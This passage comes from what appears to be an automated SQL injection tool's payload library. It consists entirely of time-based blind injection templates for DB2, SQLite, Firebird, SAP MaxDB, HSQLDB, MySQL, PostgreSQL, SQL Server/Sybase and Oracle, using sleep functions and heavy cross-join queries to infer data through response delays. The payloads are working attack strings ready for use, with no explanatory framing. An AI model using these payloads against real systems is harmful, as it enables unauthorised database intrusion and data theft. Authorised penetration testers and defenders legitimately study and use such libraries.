query)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)'}, 'vector': 'AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))', 'details': {'dbms': 'IBM DB2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'IBM DB2 OR time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)'}, 'vector': 'OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))', 'details': {'dbms': 'IBM DB2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'IBM DB2 AND time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)'}, 'vector': 'AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))', 'details': {'dbms': 'IBM DB2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'IBM DB2 OR time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)'}, 'vector': 'OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))', 'details': {'dbms': 'IBM DB2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'SQLite > 2.0 AND time-based blind (heavy query)', 'clause': [1], 'level': 3, 'request': {'payload': "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, 'vector': "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", 'details': {'dbms': 'SQLite', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'SQLite > 2.0 OR time-based blind (heavy query)', 'clause': [1], 'level': 3, 'request': {'payload': "OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, 'vector': "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", 'details': {'dbms': 'SQLite', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'SQLite > 2.0 AND time-based blind (heavy query - comment)', 'clause': [1], 'level': 5, 'request': {'comment': '--', 'payload': "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, 'vector': "AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", 'details': {'dbms': 'SQLite', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'SQLite > 2.0 OR time-based blind (heavy query - comment)', 'clause': [1], 'level': 5, 'request': {'comment': '--', 'payload': "OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"}, 'vector': "OR [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)", 'details': {'dbms': 'SQLite', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'Firebird >= 2.0 AND time-based blind (heavy query)', 'clause': [1], 'level': 4, 'request': {'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)'}, 'vector': 'AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])', 'details': {'dbms': 'Firebird', 'dbms_version': '>= 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'Firebird >= 2.0 OR time-based blind (heavy query)', 'clause': [1], 'level': 4, 'request': {'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)'}, 'vector': 'OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])', 'details': {'dbms': 'Firebird', 'dbms_version': '>= 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'Firebird >= 2.0 AND time-based blind (heavy query - comment)', 'clause': [1], 'level': 5, 'request': {'comment': '--', 'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)'}, 'vector': 'AND [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])', 'details': {'dbms': 'Firebird', 'dbms_version': '>= 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'Firebird >= 2.0 OR time-based blind (heavy query - comment)', 'clause': [1], 'level': 5, 'request': {'comment': '--', 'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)'}, 'vector': 'OR [RANDNUM]=IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])', 'details': {'dbms': 'Firebird', 'dbms_version': '>= 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'SAP MaxDB AND time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)'}, 'vector': 'AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'SAP MaxDB OR time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)'}, 'vector': 'OR [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'SAP MaxDB AND time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)'}, 'vector': 'AND [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'SAP MaxDB OR time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': 'OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)'}, 'vector': 'OR [RANDNUM]=(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB >= 1.7.2 AND time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, 'vector': "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 1.7.2'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'HSQLDB >= 1.7.2 OR time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, 'vector': "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 1.7.2'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB >= 1.7.2 AND time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, 'vector': "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 1.7.2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'HSQLDB >= 1.7.2 OR time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)"}, 'vector': "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 1.7.2'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB > 2.0 AND time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, 'vector': "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 3, 'title': 'HSQLDB > 2.0 OR time-based blind (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, 'vector': "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB > 2.0 AND time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, 'vector': "AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 3, 'title': 'HSQLDB > 2.0 OR time-based blind (heavy query - comment)', 'clause': [1, 2, 3], 'level': 5, 'request': {'comment': '--', 'payload': "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)"}, 'vector': "OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END", 'details': {'dbms': 'HSQLDB', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)', 'clause': [1, 2, 3, 4, 5], 'level': 3, 'request': {'payload': "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)"}, 'vector': "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)', 'clause': [1, 2, 3, 4, 5], 'level': 5, 'request': {'comment': '#', 'payload': "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)"}, 'vector': "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)", 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 time-based blind - Parameter replace', 'clause': [1, 2, 3], 'level': 2, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 time-based blind - Parameter replace (SELECT)', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': '(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])'}, 'vector': '(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])', 'details': {'dbms': 'MySQL', 'dbms_version': '>= 5.0.12'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'MySQL <= 5.0.11 time-based blind - Parameter replace (heavy queries)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))"}, 'vector': "(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))", 'details': {'dbms': 'MySQL', 'dbms_version': '<= 5.0.11'}, 'where': [3], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL time-based blind - Parameter replace (bool)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': '([RANDNUM]=[RANDNUM] AND SLEEP([SLEEPTIME]))'}, 'vector': '([INFERENCE] AND SLEEP([SLEEPTIME]))', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL time-based blind - Parameter replace (ELT)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': 'ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))'}, 'vector': 'ELT([INFERENCE],SLEEP([SLEEPTIME]))', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL time-based blind - Parameter replace (MAKE_SET)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': 'MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))'}, 'vector': 'MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))', 'details': {'dbms': 'MySQL'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'PostgreSQL > 8.1 time-based blind - Parameter replace', 'clause': [1, 2, 3], 'level': 3, 'request': {'payload': '(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))'}, 'vector': '(CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL', 'dbms_version': '> 8.1'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'PostgreSQL time-based blind - Parameter replace (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': '(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))'}, 'vector': '(CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ELSE [RANDNUM] END)', 'details': {'dbms': 'PostgreSQL'}, 'where': [3], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'Microsoft SQL Server/Sybase time-based blind - Parameter replace', 'clause': [1, 3], 'level': 3, 'request': {'payload': "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))"}, 'vector': "(SELECT (CASE WHEN ([INFERENCE]) THEN WAITFOR DELAY '0:0:[SLEEPTIME]' ELSE [RANDNUM]*(SELECT [RANDNUM] FROM master..sysdatabases) END))", 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'Microsoft SQL Server/Sybase time-based blind - Parameter replace (heavy queries)', 'clause': [1, 3], 'level': 4, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) ELSE [RANDNUM] END))', 'details': {'dbms': ['Microsoft SQL Server', 'Sybase'], 'os': 'Windows'}, 'where': [3], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 1, 'title': 'Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)', 'clause': [1, 3], 'level': 3, 'request': {'payload': 'BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;'}, 'vector': 'BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;', 'details': {'dbms': 'Oracle'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)', 'clause': [1, 3], 'level': 3, 'request': {'payload': "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)"}, 'vector': "(SELECT (CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)", 'details': {'dbms': 'Oracle'}, 'where': [3], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'Oracle time-based blind - Parameter replace (heavy queries)', 'clause': [1, 3], 'level': 4, 'request': {'payload': '(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)'}, 'vector': '(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE [RANDNUM] END) FROM DUAL)', 'details': {'dbms': 'Oracle'}, 'where': [3], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'SQLite > 2.0 time-based blind - Parameter replace (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "(SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))))"}, 'vector': "(SELECT (CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END))", 'details': {'dbms': 'SQLite', 'dbms_version': '> 2.0'}, 'where': [3], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'Firebird time-based blind - Parameter replace (heavy query)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': '(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)'}, 'vector': 'IIF(([INFERENCE]),(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4),[RANDNUM])', 'details': {'dbms': 'Firebird', 'dbms_version': '>= 2.0'}, 'where': [3], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'SAP MaxDB time-based blind - Parameter replace (heavy query)', 'clause': [1, 3], 'level': 5, 'request': {'payload': '(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)'}, 'vector': '(SELECT COUNT(*) FROM (SELECT * FROM DOMAIN.DOMAINS WHERE ([INFERENCE])) AS T1,(SELECT * FROM DOMAIN.COLUMNS WHERE ([INFERENCE])) AS T2,(SELECT * FROM DOMAIN.TABLES WHERE ([INFERENCE])) AS T3)', 'details': {'dbms': 'SAP MaxDB'}, 'where': [3], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'IBM DB2 time-based blind - Parameter replace (heavy query)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': '(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)'}, 'vector': '(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3 WHERE ([INFERENCE]))', 'details': {'dbms': 'IBM DB2'}, 'where': [3], 'response': {'time': '[DELAYED]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB >= 1.7.2 time-based blind - Parameter replace (heavy query)', 'clause': [1, 2, 3], 'level': 4, 'request': {'payload': "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)"}, 'vector': "(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)", 'details': {'dbms': 'HSQLDB', 'dbms_version': '>= 1.7.2'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 2, 'title': 'HSQLDB > 2.0 time-based blind - Parameter replace (heavy query)', 'clause': [1, 2, 3], 'level': 5, 'request': {'payload': "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))"}, 'vector': "(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))", 'details': {'dbms': 'HSQLDB', 'dbms_version': '> 2.0'}, 'where': [1], 'response': {'time': '[SLEEPTIME]'}, 'stype': 5}, {'risk': 1, 'title': 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause', 'clause': [2, 3], 'level': 3, 'request': {'payload': ',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.CHARACTER_SETS) END))'}, 'vector': ',(SELECT (CASE 